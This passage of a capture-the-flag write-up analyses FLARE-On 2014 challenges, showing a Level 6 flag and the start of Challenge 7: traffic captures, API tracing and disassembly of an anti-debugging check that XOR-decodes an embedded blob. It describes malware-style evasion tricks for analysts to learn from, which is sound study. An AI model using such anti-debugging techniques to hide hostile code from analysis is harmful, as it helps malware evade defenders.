&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;join(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;map&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;chr&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;arg2))&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# output&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;l1nhax&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;hurt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;u5&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;a1l&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;@flaZZZZZZZZZZ&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/Wartortell&#34; target=&#34;_blank&#34;&gt;@Wartortell&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;level-6-flag-l1nhax-hurt-u5-a1l-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Level 6 flag: l1nhax.hurt.u5.a1l@flare-on.com&lt;/h4&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;a-name-ch7-a-challenge-7-the-doge-strikes-back:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;&lt;a name=&#34;ch7&#34;&gt;&lt;/a&gt; Challenge 7 - The Doge Strikes Back&lt;/h2&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Alright! Last one, can you get to the finish line? Keep it up!
-FLARE
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;By this time we have already fallen into a pre-check routine. Filename is &lt;code&gt;d69650fa6d4825ec2ddeecdc6a92228d&lt;/code&gt; (MD5 hash) and googling brings up no notable results.&lt;/p&gt;

&lt;p&gt;PE-Studio stuff:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Win32 executable&lt;/li&gt;
&lt;li&gt;VirusTotal score: 5 / 55&lt;/li&gt;
&lt;li&gt;Imported libraries: ws2_32.dll, kernel32.dll and wininet.dll. &lt;code&gt;wininet.dll&lt;/code&gt; is for the interwebz&lt;/li&gt;
&lt;li&gt;Imported symbols: Lots of them. Functions for creating network sockets, hostname lookups, creating, reading and writing files and general anti-debug/anti-vm stuff&lt;/li&gt;
&lt;li&gt;Strings: Not as many strings as challenge 6. cmd.exe and 127.0.0.1 look interesting&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I used &lt;code&gt;API Monitor&lt;/code&gt; to observe application&amp;rsquo;s API calls. It crashed after a while and API Monitor flagged 230k calls. Sifting through them is not practical but a lot of them are redundant and do not look interesting. For example there are a lot of &lt;code&gt;LocalAlloc&lt;/code&gt; and &lt;code&gt;LocalFree&lt;/code&gt; calls. Right click any call and select &lt;code&gt;Exclude &amp;gt; API Name&lt;/code&gt; to filter it. After excluding a lot of stuff, there was still so much crap. So instead I tried to look at API calls to certain Dlls for example &lt;code&gt;wininet.dll&lt;/code&gt;. Under &lt;code&gt;Monitored Processes&lt;/code&gt; navigate to &lt;code&gt;Modules&lt;/code&gt; and then select a specific Dll to only see its calls. Let&amp;rsquo;s search for specific calls that we noticed in PE-Studio. API Monitor also supports searching in MSDN. Double click a call or right click and select &lt;code&gt;Online Help (MSDN)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I searched for &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;gethostbyname&lt;/a&gt; and found some interesting results:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-1.jpg&#34; alt=&#34;Dogecoin&#34; title=&#34;Dogecoin&#34; /&gt;&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Calls for gethostbyname&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;gethostbyname&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;www.dogecoin.com&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;gethostbyname&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;e.root-servers.net&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I was curious about these connections so I captured the traffic using &lt;code&gt;Wireshark&lt;/code&gt; from launch to crash.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Traffic summary - some lines omitted&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;192.168.1.1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;DNS&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;76&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Standard&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0xbbc7&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;www.dogecoin.com&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;192.168.1.1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;DNS&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;106&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Standard&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;response&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0xbbc7&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;CNAME&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;dogecoin.com&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;204.232.175.78&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;192.168.1.1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;DNS&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;78&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Standard&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0xa75d&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;e.root-servers.net&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;192.168.1.1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;DNS&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;94&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Standard&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;response&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0xa75d&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;192.203.230.10&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;192.168.1.1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;DNS&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;71&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Standard&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0x7524&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;twitter.com&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;192.168.1.1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;DNS&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;135&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Standard&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;response&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0x7524&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.70&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.6&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.102&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;TLSv1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;124&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Client&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Hello&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;TLSv1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;1474&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Server&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Hello&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;TLSv1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;382&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Certificate&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;TLSv1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;368&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Client&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Key&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Exchange,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Change&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Cipher&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Spec,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Encrypted&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Handshake&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Message&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;TLSv1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;101&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Change&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Cipher&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Spec,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Encrypted&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Handshake&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Message&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;TLSv1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;260&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Application&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Data&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;TLSv1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;1431&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Application&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Data&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;199.16.156.198&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;10.0.2.15&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;TLSv1&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;1474&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;Application&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Data&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Query for &lt;code&gt;www.dogecoin.com&lt;/code&gt;, &lt;code&gt;e.root-servers.net&lt;/code&gt; and &lt;code&gt;www.twitter.com&lt;/code&gt;. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let&amp;rsquo;s search for &amp;ldquo;twitter&amp;rdquo; in API Monitor and we see this &lt;code&gt;InternetOpenUrlW ( 0x00cc0004, &amp;quot;https://twitter.com/FireEye/status/484033515538116608&amp;quot;, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )&lt;/code&gt;. Let&amp;rsquo;s find that tweet and it looks normal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-2.jpg&#34; alt=&#34;When embed tweet plugins for Octopress don&#39;t work&#34; title=&#34;When embed tweet plugins for Octopress don&#39;t work&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After migrating to &lt;a href=&#34;https://gohugo.io&#34; target=&#34;_blank&#34;&gt;Hugo&lt;/a&gt;, I can embed tweets now.&lt;/p&gt;

&lt;p&gt;&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;The Service You Can’t Refuse: A Secluded HijackRAT &lt;a href=&#34;http://t.co/ckx18JHdkb&#34;&gt;http://t.co/ckx18JHdkb&lt;/a&gt; &lt;a href=&#34;https://twitter.com/hashtag/infosec?src=hash&#34;&gt;#infosec&lt;/a&gt; &lt;a href=&#34;https://twitter.com/hashtag/malware?src=hash&#34;&gt;#malware&lt;/a&gt;&lt;/p&gt;&amp;mdash; FireEye (@FireEye) &lt;a href=&#34;https://twitter.com/FireEye/status/484033515538116608&#34;&gt;July 1, 2014&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;Because this challenge employs a good number of Anti-Debug/Anti-VM protections, I will try to explain what I learned at each stage. Even after finishing the challenge I went back and looked at some steps again to learn more.&lt;/p&gt;

&lt;p&gt;Here are some useful resources:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://pferrie.host22.com/papers/antidebug.pdf&#34; target=&#34;_blank&#34;&gt;The &amp;ldquo;Ultimate&amp;rdquo; Anti-Debugging Reference (PDF)&lt;/a&gt; by &lt;code&gt;Peter Ferrie&lt;/code&gt;. I had to remind myself what year it was after I visited &lt;a href=&#34;http://pferrie.host22.com/&#34; target=&#34;_blank&#34;&gt;his website&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://practicalmalwareanalysis.com/&#34; target=&#34;_blank&#34;&gt;Practical Malware Analysis book&lt;/a&gt; chapters 16 and 17 deal with Anti-Debugging and Anti-VM techniques&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/&#34; target=&#34;_blank&#34;&gt;Five Anti-Analysis Tricks That Sometimes Fool Analysts&lt;/a&gt; was published when I was writing this post&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Find &lt;code&gt;main&lt;/code&gt; and put a breakpoint on it. As we go through main we reach a bunch of function calls. Let&amp;rsquo;s start with the first one.&lt;/p&gt;

&lt;h4 id=&#34;function-1-isdebuggerpresent:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 1 - isDebuggerPresent?&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401030&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4010C0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401130&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4011D0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4012A0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401350&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4013F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401460&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-3.jpg&#34; alt=&#34;isDebuggerPresent&#34; title=&#34;isDebuggerPresent&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The result of a function call &lt;code&gt;isDebuggerPresent&lt;/code&gt; is compared with 0 by &lt;code&gt;test eax, eax&lt;/code&gt;. This function will return 1 if the application is being debugged. In our case it will return 1 and the jump fails. Before the compare we see a value &lt;code&gt;0x106240&lt;/code&gt; or &lt;code&gt;1073728&lt;/code&gt; is loaded into &lt;code&gt;esi&lt;/code&gt;. On both sides we see a string being loaded and then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing &lt;code&gt;oh happy dayz&lt;/code&gt; with the data at &lt;code&gt;byte_4131F8&lt;/code&gt;. If we reach the end of the string it will restart from the first character. This loop will go on for &lt;code&gt;1073728&lt;/code&gt; bytes which seems to be length of data starting at &lt;code&gt;byte_4131F8&lt;/code&gt;. I am going to rename it to &lt;code&gt;blob&lt;/code&gt; and the number &lt;code&gt;0x106240&lt;/code&gt; to &lt;code&gt;blob_length&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If debugger is present, we go left and the string &lt;code&gt;oh happy dayz&lt;/code&gt; is xor-ed with the blob. If no debugger is present, we jump to the right branch and string &lt;code&gt;the final countdown&lt;/code&gt; is xor-ed with the &lt;code&gt;blob&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;isDebuggerPresent&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(isDebuggerPresent):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;oh happy dayz&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;the final countdown&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
